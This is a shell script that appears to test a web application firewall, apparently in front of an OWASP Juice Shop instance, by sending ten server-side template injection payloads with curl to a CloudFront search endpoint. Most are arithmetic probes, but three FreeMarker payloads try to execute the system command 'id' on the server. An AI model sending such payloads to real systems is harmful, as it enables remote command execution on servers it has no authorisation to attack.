#!/bin/bash
# WAF Bypass Test — SSTI (10 payloads)
# Run: bash curl_ssti.sh

ENDPOINT="https://dlpaasrngb6ue.cloudfront.net"

echo "[ssti] juiceshop-0216: <%= 7 * 7 %>"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0216" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "<%= 7 * 7 %>"}'
echo ""

echo "[ssti] juiceshop-0217: $\{7*7\}"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0217" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "$\\\\{7*7\\\\}"}'
echo ""

echo "[ssti] juiceshop-0219: %7B%7B7*7%7D%7D"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0219" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "%7B%7B7*7%7D%7D"}'
echo ""

echo "[ssti] juiceshop-0220: %24%7B7*7%7D"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0220" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "%24%7B7*7%7D"}'
echo ""

echo "[ssti] juiceshop-0221: $\{3*3\}"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0221" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "$\\\\{3*3\\\\}"}'
echo ""

echo "[ssti] juiceshop-0222: $\{\{7*7\}\}"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0222" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "$\\\\{\\\\{7*7\\\\}\\\\}"}'
echo ""

echo "[ssti] juiceshop-0223: @(1+2)"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0223" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "@(1+2)"}'
echo ""

echo "[ssti] juiceshop-0225: <#assign ex = "freemarker.template.utility.Execute"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0225" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "<#assign ex = \\"freemarker.template.utility.Execute\\"?new()>$\\\\{ ex(\\"id\\")\\\\}"}'
echo ""

echo "[ssti] juiceshop-0226: [#assign ex = 'freemarker.template.utility.Execute"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0226" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "[#assign ex = \'freemarker.template.utility.Execute\'?new()]$\\\\{ ex(\'id\')\\\\}"}'
echo ""

echo "[ssti] juiceshop-0227: $\{"freemarker.template.utility.Execute"?new()("id"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0227" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "$\\\\{\\"freemarker.template.utility.Execute\\"?new()(\\"id\\")\\\\}"}'
echo ""
